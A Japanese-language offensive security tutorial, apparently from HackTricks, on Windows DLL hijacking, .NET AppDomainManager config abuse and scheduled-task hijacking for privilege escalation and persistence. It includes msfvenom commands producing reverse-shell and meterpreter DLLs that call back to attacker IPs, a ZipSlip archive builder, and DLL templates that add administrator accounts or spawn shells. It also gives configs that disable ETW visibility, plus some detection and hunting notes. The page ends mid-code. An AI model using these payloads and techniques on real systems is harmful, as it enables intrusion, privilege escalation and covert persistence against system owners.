# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本情報

DLL Hijacking は、信頼されたアプリケーションに悪意のある DLL を読み込ませる手法です。この用語には、**DLL Spoofing、Injection、Side-Loading** など、複数の手法が含まれます。主にコード実行や永続化の達成に利用され、権限昇格に使われることは比較的まれです。ここでは権限昇格に焦点を当てていますが、目的が異なっても hijacking の手法は同じです。

### 一般的な手法

DLL Hijacking には複数の手法があり、それぞれの有効性はアプリケーションの DLL 読み込み方法によって異なります:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: 正規の DLL を悪意のあるものに置き換える手法です。必要に応じて DLL Proxying を使い、元の DLL の機能を維持できます。
2. **DLL Search Order Hijacking**: アプリケーションの検索順序を悪用し、正規の DLL より優先される検索パスに悪意のある DLL を配置する手法です。
3. **Phantom DLL Hijacking**: 存在しない必須 DLL だとアプリケーションに思い込ませて、読み込ませる悪意のある DLL を作成する手法です。
4. **DLL Redirection**: `%PATH%` や `.exe.manifest` / `.exe.local` ファイルなどの検索パラメーターを変更し、アプリケーションが悪意のある DLL を読み込むよう誘導する手法です。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内の正規 DLL を悪意のあるものに置き換える手法です。DLL side-loading と関連付けられることがよくあります。
6. **Relative Path DLL Hijacking**: コピーしたアプリケーションとともに、悪意のある DLL をユーザーが制御できるディレクトリに配置する手法です。Binary Proxy Execution の手法に似ています。

アプリケーションが**独自の DLL loader**を実装している場合もあります。特権プロセスが `Libraries` や `Plugins` などの子ディレクトリを列挙し、通常の Windows DLL 検索順序とは別に、選択した DLL をヘルパーに渡すことがあります。別のアカウントがそのディレクトリにファイルを作成できる場合は、調査の手がかりとして扱いましょう。プロセスの実行ユーザー、ディレクトリに適用される ACL、ファイルの選択規則、そして DLL の読み込み処理に到達できるかを確認してください。実行ファイルの隣にあるディレクトリが書き込み可能だからといって、そのプロセスがそこから DLL を読み込むとは限りません。

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

従来の DLL sideloading だけが、信頼された **.NET Framework** プロセスに攻撃者のコードを読み込ませる方法ではありません。対象の実行ファイルが**managed** アプリケーションの場合、CLR は実行ファイル名に基づく**アプリケーション構成ファイル**（例: `Setup.exe.config`）も参照します。このファイルでは、カスタム **AppDomainManager** を定義できます。構成ファイルが、EXE と同じディレクトリに置かれた攻撃者が制御するアセンブリを指定している場合、CLR は**アプリケーションの通常のコードパスより先に**それを読み込み、信頼されたプロセス内で実行します。<sup>[[24]](#references)</sup>

Microsoft の .NET Framework 構成スキーマによると、カスタム manager を使用するには `<appDomainManagerAssembly>` と `<appDomainManagerType>` の両方が必要です。<sup>[[16]](#references)[[17]](#references)</sup>

最小限の構成:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

最小限のマネージャー：

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

実践上の注意点:
- これは **.NET Framework 固有**の tradecraft です。Win32 DLL の検索順序ではなく、CLR の config 解析に依存します。
- ホストは実際に **managed EXE** である必要があります。簡易トリアージには `sigcheck -m target.exe`、`corflags target.exe` を使うか、PE メタデータの **CLR Runtime Header** を確認します。
- config ファイル名は実行ファイル名と完全に一致する必要があり（`<binary>.config`）、通常は **EXE と同じ場所**にあります。
- **署名済みの Microsoft/vendor バイナリ**で有効な手法です。信頼された EXE を変更せずに、悪意のある managed assembly をプロセス内で実行できます。
- 書き込み可能な installer/update ディレクトリをすでに利用できる場合、AppDomainManager hijacking を **第 1 段階**として使い、その後の段階で従来型の DLL sideloading や reflective loading を実行できます。

### downloader + scheduled-task bootstrap としての AppDomainManager

実践的な侵入パターンとして、信頼された managed EXE と、**小規模な bootstrapper** としてのみ動作する悪意のある `*.config` および悪意のある AppDomainManager DLL を組み合わせます:<sup>[[25]](#references)</sup>

1. ユーザーが `%USERPROFILE%\Downloads` のような信頼できそうな場所から、署名済みの .NET installer または updater を起動します。
2. 隣接する config によって、正規のアプリケーションロジックが開始する**前に** CLR が攻撃者の assembly を読み込みます。
3. 悪意のある manager が **path gate** を実行します（たとえば、ホスト EXE が `Downloads` から実行されている場合にのみ処理を続け、第 2 段階は `%LOCALAPPDATA%` から実行される場合にのみ許可します）。
4. チェックに通ると、ユーザーが書き込み可能な `%LOCALAPPDATA%\PerfWatson2.exe` のようなパスに実際の payload をダウンロードし、scheduled task で永続化を設定します。

この手法が重要な理由:
- 署名済みホスト EXE は変更されないため、メインバイナリのハッシュしか確認しないトリアージでは侵害を見逃す可能性があります。
- 単純な **パスベースの anti-analysis** はよく使われます。ZIP/EXE/DLL の 3 点セットを Desktop、Temp、または sandbox のパスに移動すると、意図的にチェーンが破綻する場合があります。
- 第 1 段階の AppDomainManager DLL は小さく、目立たないままにして、実際の implant を後から取得できます。

このパターンでよく見られる最小限の永続化の例:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notes:
- `/rl highest` は、そのユーザー/セッションで**利用可能な最も高い権限**を意味します。それだけでSYSTEMへの昇格が保証されるわけではありません。
- この手法は、従来のDLL検索順序ハイジャックというより、**.NET configの悪用による実行/永続化**に分類するほうが適切な場合がよくあります。ただし、攻撃者は両方を頻繁に組み合わせます。

検出の手掛かり:
- ZIPの展開先、`Downloads`、`%TEMP%`、その他のユーザーが書き込み可能なフォルダーから起動された、署名済みの.NET実行ファイルと**同じ場所にある**`<exe>.config`。
- アクションの実行先が`%LOCALAPPDATA%`、`%APPDATA%`、または`Downloads`内で、名前がブラウザーやベンダーのアップデーターを装っている新しいスケジュールタスク。
- 別のEXEをすぐにダウンロードし、その後`schtasks.exe`を起動する、短時間だけ実行されるmanaged bootstrapプロセス。
- 実行ファイルのパスが想定されたユーザープロファイルのディレクトリと一致しない場合、早期終了するサンプル。

### 既存のスケジュールタスクをハイジャックしてsideloadチェーンを再実行する

永続化を探す際は、**新しいタスクの作成**だけに注目しないでください。一部の侵入グループは、正規のインストーラーが**通常のアップデータータスク**を作成するまで待ち、その後、タスクのアクションを書き換えます。こうすることで、既存の名前、作成者、トリガーが維持され、ディフェンダーに正規のタスクだと思わせることができます。

再利用可能な手順:
1. 正規のソフトウェアをインストール/実行し、通常作成されるタスクを特定します。
2. タスクのXMLをエクスポートし、現在の`<Exec><Command>` / `<Arguments>`の値を記録します。<sup>[[23]](#references)</sup>
3. アクションだけを置き換え、ユーザーが書き込み可能なステージングディレクトリにある**信頼できるホストEXE**をタスクで起動するようにします。このEXEが、実際のペイロードをside-loadするか、AppDomain-loadします。
4. 目立つ永続化アーティファクトを新たに作る代わりに、同じタスク名でタスクを再登録します。

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

なぜ stealthier なのか:
- タスク名は正当なものに見せかけられる（例: vendor updater）。
- **Task Scheduler service** が起動するため、親プロセスや祖先プロセスの検証では、`explorer.exe` ではなく想定どおりのスケジュール実行チェーンが確認されることが多い。
- **新しいタスク名** だけを探す DFIR チームは、登録済みのタスクのアクションが `%LOCALAPPDATA%`、`%APPDATA%`、または攻撃者が制御する別のパスを指すように変更されていても、見逃す可能性がある。

すばやく調査するためのポイント:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` の XML と `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` のメタデータをベースラインと比較する。
- **vendor updater に見えるタスク** が **ユーザーが書き込み可能なディレクトリ** から実行される場合や、同じディレクトリにある `*.config` ファイルとともに .NET EXE を起動する場合にアラートを出す。

> [!TIP]
> HTML staging、AES-CTR configs、.NET implants を DLL sideloading に重ねる手順を追ったチェーンについては、以下のワークフローを参照してください。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 不足している DLL の特定

システム内で不足している Dlls を見つける最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を実行し、**次の2つのフィルターを設定する**ことです。

![Common Techniques - 不足している Dlls の特定: システム内で不足している Dlls を見つける最も一般的な方法は、sysinternals の procmon を実行し、次の2つのフィルターを設定することです](<../../../images/image (961).png>)

![Common Techniques - 不足している Dlls の特定: システム内で不足している Dlls を見つける最も一般的な方法は、sysinternals の procmon を実行し、次の2つのフィルターを設定することです](<../../../images/image (230).png>)

そして、**File System Activity** だけを表示します。

![Common Techniques - 不足している Dlls の特定: File System Activity だけを表示する](<../../../images/image (153).png>)

**一般に不足している dlls** を探す場合は、これを**数秒間**実行したままにします。\
**特定の executable 内で不足している DLL** を探す場合は、**"Process Name" "contains" `<exec name>`** などのフィルターを追加で設定し、その executable を実行してから、イベントのキャプチャを停止します。<sup>[[9]](#references)</sup>

## 不足している DLL の悪用

権限昇格を行うには、書き込み可能な場所から読み込もうとする**特権プロセスの DLL** を探します。正規の DLL があるディレクトリより先に検索されるディレクトリを制御している場合や、要求された DLL が存在せず、検索対象のディレクトリのいずれかに書き込める場合に、これが起こる可能性があります。

### DLL の検索順序

[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **では、DLL がどのように読み込まれるかを具体的に確認できます。**

**Windows applications** は、あらかじめ定義された一連の検索パスを決められた順序でたどり、DLL を探します。DLL hijacking は、悪意のある DLL をこれらのディレクトリのいずれかに戦略的に配置し、正規の DLL より先に読み込ませることで発生します。これを防ぐには、必要な DLL を参照する際に、アプリケーションが絶対パスを使うようにします。

以下に**32-bit** システムでの **DLL の検索順序**を示します。

1. アプリケーションを読み込んだディレクトリ。
2. システムディレクトリ。このディレクトリのパスを取得するには、[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 関数を使います。(_C:\Windows\System32_)
3. 16-bit システムディレクトリ。このディレクトリのパスを取得する関数はありませんが、検索対象になります。(_C:\Windows\System_)
4. Windows ディレクトリ。このディレクトリのパスを取得するには、[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 関数を使います。
   1. (_C:\Windows_)
5. 現在のディレクトリ。
6. PATH 環境変数に記載されているディレクトリ。これには、**App Paths** レジストリキーで指定されたアプリケーションごとのパスは含まれないことに注意してください。**App Paths** キーは DLL の検索パスの計算には使われません。

これは、**SafeDllSearchMode** が有効な場合の**デフォルト**の検索順序です。無効にすると、現在のディレクトリが2番目になります。この機能を無効にするには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** レジストリ値を作成し、0 に設定します（デフォルトでは有効）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数が **LOAD_WITH_ALTERED_SEARCH_PATH** を指定して呼び出された場合、検索は **LoadLibraryEx** が読み込む executable module のディレクトリから始まります。

最後に、DLL は名前ではなく絶対パスを指定して読み込むこともできます。その場合、Windows は DLL 自体についてはそのパスだけを検索します。名前で指定された依存 DLL には、引き続き該当する検索順序が適用されます。

検索順序を変更する方法はほかにもありますが、ここでは説明しません。

### 任意のファイル書き込みを不足 DLL の hijack につなげる

**関連する technique:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation)。

1. **ProcMon** のフィルター（`Process Name` = 対象の EXE、`Path` ends with `.dll`、`Result` = `NAME NOT FOUND`）を設定し、プロセスが探しているものの見つからない DLL 名を収集します。<sup>[[14]](#references)</sup>
2. バイナリが**スケジュールまたはサービス**で実行される場合、その DLL 名のいずれかを**アプリケーションディレクトリ**（検索順序の #1）に配置すると、次回の実行時に読み込まれます。ある .NET scanner のケースでは、プロセスは本物のコピーを `C:\Program Files\dotnet\fxr\...` から読み込む前に、`C:\samples\app\` 内で `hostfxr.dll` を探していました。
3. payload DLL（例: reverse shell）を任意の export 付きで作成します: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`。
4. 使用できる primitive が **ZipSlip-style arbitrary write** の場合、展開先ディレクトリから抜け出して DLL がアプリケーションフォルダーに配置されるよう ZIP のエントリを作成します。

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. アーカイブを監視対象の inbox/share に配置します。スケジュールされたタスクがプロセスを再起動すると、悪意のある DLL が読み込まれ、サービスアカウントとしてコードが実行されます。

### RTL_USER_PROCESS_PARAMETERS.DllPath による sideloading の強制

新しく作成するプロセスの DLL 検索パスを確実に変更する高度な方法は、ntdll のネイティブ API でプロセスを作成する際に、RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定することです。攻撃者が制御するディレクトリをここに指定すると、インポートした DLL を名前で解決する（絶対パスを使用せず、安全な読み込みフラグも使用しない）対象プロセスに、そのディレクトリから悪意のある DLL を読み込ませることができます。

主なポイント
- RtlCreateProcessParametersEx でプロセスパラメーターを作成し、制御下のフォルダー（例：dropper/unpacker があるディレクトリ）を指すカスタム DllPath を指定します。
- RtlCreateUserProcess でプロセスを作成します。対象バイナリが DLL を名前で解決すると、ローダーは解決時に指定された DllPath を参照するため、悪意のある DLL を対象 EXE と同じ場所に置かなくても、確実な sideloading が可能になります。

注意点と制限
- これは作成される子プロセスに影響します。現在のプロセスだけに影響する SetDllDirectory とは異なります。
- 対象は DLL を名前でインポートするか、LoadLibrary を使う必要があります（絶対パスを使用せず、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories も使用しないこと）。
- KnownDLLs とハードコードされた絶対パスは hijack できません。転送された export や SxS によって優先順位が変わることがあります。

最小限の C の例（ntdll、ワイド文字列、簡略化したエラー処理）：

<details>
<summary>完全な C の例：RTL_USER_PROCESS_PARAMETERS.DllPath による DLL sideloading の強制</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

運用例
- 必要な関数をエクスポートするか、本物の DLL にプロキシする悪意のある xmllite.dll を、DllPath ディレクトリに配置します。
- 上記の手法で xmllite.dll を名前で検索することが知られている署名済みバイナリを起動します。ローダーは指定された DllPath 経由でインポートを解決し、DLL を sideloading します。

この手法は、実環境で複数段階の sideloading チェーンを実行するために使われていることが確認されています。最初のランチャーがヘルパー DLL をドロップし、その DLL がカスタム DllPath を指定して Microsoft 署名済みの hijack可能なバイナリを起動し、ステージングディレクトリから攻撃者の DLL を強制的に読み込ませます。<sup>[[6]](#references)</sup>


### `.exe.config` 経由の .NET AppDomainManager hijacking

**.NET Framework** のターゲットでは、アプリケーションに隣接する **`.exe.config`** ファイルを悪用することで、メモリをパッチせずに **`Main()` の実行前**に sideloading できます。攻撃者は Win32 DLL の検索順序だけに頼るのではなく、正規の .NET EXE と悪意のある config ファイル、さらに攻撃者が制御する 1 つ以上のアセンブリを隣接して配置します。

このチェーンの動作:<sup>[[15]](#references)[[22]](#references)</sup>
1. ホスト EXE が起動し、**CLR が `<exe>.config` を読み込みます**。
2. config で **`<appDomainManagerAssembly>`** と **`<appDomainManagerType>`** を設定し、ランタイムに攻撃者が制御する `AppDomainManager` をインスタンス化させます。
3. 悪意のある manager により、信頼されたホストプロセス内で **`Main()` の実行前にコードが実行されます**。
4. 同じ config で、CLR がローカルアセンブリ（例: `InitInstall.dll`、`Updater.dll`、`uevmonitor.dll`）を最初に解決するよう強制できます。また、インラインパッチを使わずにランタイムの検証やテレメトリーを弱めることもできます。

キャンペーンで見られるパターン（正確な入れ子構造はディレクティブや CLR のバージョンによって異なる場合があります）:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

有用な理由:
- **`<probing privatePath="."/>`** はアセンブリの解決先をアプリケーションディレクトリに限定し、そのフォルダーを予測可能なサイドローディングの対象にします。<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** は、正規のアプリケーションロジックが実行される前の CLR 初期化中に、攻撃者のコードへ実行を移します。<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** により、強名の検証エラーを発生させずに、完全信頼のアプリが署名なし、または改ざんされたアセンブリを読み込める場合があります。<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** は、publisher policy による新しいアセンブリへのリダイレクトを回避します。<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** により、ランタイムの選択がより予測可能になります。<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** は特に注目すべき設定です。implant がメモリ内の `EtwEventWrite` を patch するのではなく、構成設定によって **CLR 自体の ETW への可視性を無効化**します。

最近のキャンペーンで見られる運用パターン:
- ステージ 1 では、`setup.exe`、`setup.exe.config`、ローカルアセンブリを配置します。
- ステージ 2 では、それらをもっともらしい **AppData の update** フォルダーにコピーし、ホストの名前を `update.exe` のようなものに変更して、**scheduled task** 経由で再起動します。
- ステージ 3 では、最終的な RAT DLL/export を読み込む前に実行コンテキスト（例: Task Scheduler によって起動されたときに、想定される親プロセスが `svchost.exe` であること）を確認します。

ハンティングの着眼点:
- ユーザーが書き込み可能な場所で、不審な隣接 **`.config`** ファイルとともに実行される、署名済みまたは正規の **.NET 実行ファイル**。
- **`appDomainManagerAssembly`**、**`appDomainManagerType`**、**`probing privatePath="."`**、**`bypassTrustedAppStrongNames`**、**`etwEnable enabled="false"`** を含む `.config` ファイル。
- **`%LOCALAPPDATA%`** またはアプリ固有の `\bin\update\` ディレクトリから、名前を変更した update バイナリを再起動する scheduled task。
- scheduled task が信頼された .NET ホストを起動し、そのホストが直ちに自身のディレクトリからベンダー製ではないアセンブリを読み込む親子プロセスの連鎖。

#### Windows のドキュメントに記載されている DLL 検索順序の例外

Windows のドキュメントには、標準の DLL 検索順序に対する特定の例外が記載されています。

- **メモリにすでに読み込まれている DLL と同じ名前の DLL** が見つかった場合、システムは通常の検索を省略します。代わりに、リダイレクトとマニフェストを確認し、その後、メモリにある DLL を使用します。**この場合、システムは DLL を検索しません**。
- DLL が現在の Windows バージョンの **既知の DLL** として認識される場合、システムは既知の DLL のバージョンと、その依存 DLL を使用し、**検索を行いません**。レジストリキー **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** に、これらの既知の DLL の一覧が格納されています。
- **DLL に依存関係がある**場合、依存 DLL の検索は、最初の DLL がフルパスで特定されていたかどうかにかかわらず、依存 DLL が **モジュール名だけで指定された**ものとして行われます。

### 権限昇格

**要件**:

- **異なる権限**（水平移動またはラテラル移動）で動作している、または動作する予定のプロセスで、**DLL が不足している**ものを特定する。
- **DLL** の検索対象となる **ディレクトリ**のいずれかに、書き込みアクセスできることを確認する。この場所は、実行ファイルのディレクトリ、またはシステムパス内のディレクトリである可能性があります。

これらの前提条件は、デフォルトではまれです。権限の高い実行ファイルに DLL 依存関係の欠落があることは通常なく、標準ユーザーがシステムの検索パス内のディレクトリに書き込めることも通常ありません。それでも、設定ミスのある環境では両方の条件がそろう可能性があります。\
要件を満たす場合は、[UACME](https://github.com/hfiref0x/UACME) プロジェクトを確認してください。主な目的は UAC bypass ですが、特定の Windows バージョン向けの DLL hijacking PoC が含まれており、見つかった書き込み可能なディレクトリに合わせて応用できる場合があります。

次の方法で**フォルダー内の権限を確認**できます:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

また、**PATH 内のすべてのフォルダーの権限を確認してください**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

実行ファイルの imports と dll の exports も次の方法で確認できます：

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

For **System Path folder**への書き込み権限を利用して、**DLL Hijackingを悪用して権限昇格する**方法の詳細なガイドは、こちらを確認してください:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自動化ツール

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、system PATH内の任意のフォルダーに書き込み権限があるかを確認します。\
この脆弱性を見つけるための、その他の便利な自動化ツールとして、**PowerSploitの関数**である _Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_があります。

### 例

悪用可能なシナリオを見つけた場合、攻撃を成功させるために最も重要なことの1つは、**実行ファイルがインポートするすべての関数を少なくともエクスポートするdllを作成すること**です。なお、DLL Hijackingは、[Medium Integrity levelからHigh **(UACをバイパス)**](../../authentication-credentials-uac-and-efs/index.html#uac)へ、または[ **High IntegrityからSYSTEMへ**](../index.html#from-high-integrity-to-system)**権限昇格する**際にも役立ちます。実行を目的としたDLL hijackingに焦点を当てたこの調査記事には、**有効なdllの作成方法**の例があります: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
さらに、**次のセクション**には、**テンプレート**として、または**不要な関数をエクスポートするdll**の作成に役立つ**基本的なdllコード**があります。

## **DLLの作成とコンパイル**

### **DLL Proxifying**

基本的に、**DLL proxy**は、**ロード時に悪意のあるコードを実行**できるだけでなく、**実際のライブラリにすべての呼び出しを転送することで**、**期待どおりに公開され、動作する**DLLです。

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)または[**Spartacus**](https://github.com/Accenture/Spartacus)を使うと、実行ファイルを**指定して、proxifyするライブラリを選択**し、**proxified dllを生成**できます。または、**DLLを指定**して**proxified dllを生成**できます。

### **Meterpreter**

**rev shellを取得 (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**meterpreter を取得する (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**ユーザーを作成（x86 では x64 版を見つけられませんでした）:**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### 自作

多くの場合、コンパイルする DLL は**victim process がインポートするすべての関数を export する必要があります**。必要な export が欠けていると、binary が関数を解決できず、exploit は失敗します。

<details>
<summary>C DLLテンプレート (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>ユーザー作成を行うC++ DLLの例</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>スレッドエントリを備えた別のC DLL</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## ケーススタディ: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe は起動時に、予測可能な言語固有の localization DLL を引き続きプローブします。この DLL を hijack すると、任意のコード実行や永続化が可能です。<sup>[[7]](#references)</sup>

主な事実
- プローブパス (現行ビルド): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US)。
- レガシーパス (旧ビルド): `%windir%\System32\speech\engine\tts\msttslocenus.dll`。
- 攻撃者が制御する書き込み可能な DLL が OneCore パスに存在すると、ロードされ、`DllMain(DLL_PROCESS_ATTACH)` が実行されます。エクスポートは不要です。

Procmon による検出
- フィルター: `Process Name is Narrator.exe` および `Operation is Load Image` または `CreateFile`。
- Narrator を起動し、上記パスへのロード試行を確認します。

最小 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
